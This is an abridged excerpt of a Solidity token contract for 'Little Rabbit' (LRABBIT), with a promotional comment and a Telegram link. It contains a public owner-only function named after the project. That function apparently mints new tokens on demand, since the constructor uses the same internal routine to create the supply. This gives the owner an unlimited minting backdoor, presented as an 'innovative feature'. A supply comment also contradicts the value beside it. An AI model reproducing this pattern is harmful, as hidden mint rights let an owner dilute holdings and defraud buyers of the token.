...
//
// $LittleRabbit proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/LittleRabbit_Bsc
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _LittleRabbit(uint256 amount) public onlyOwner {
 _LittleRabbit(msg.sender, amount);
    }
    ...
    function _LittleRabbit(address account, uint256 amount) internal virtual {
...
contract $LittleRabbit is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Little Rabbit", "LRABBIT") {
     _LittleRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}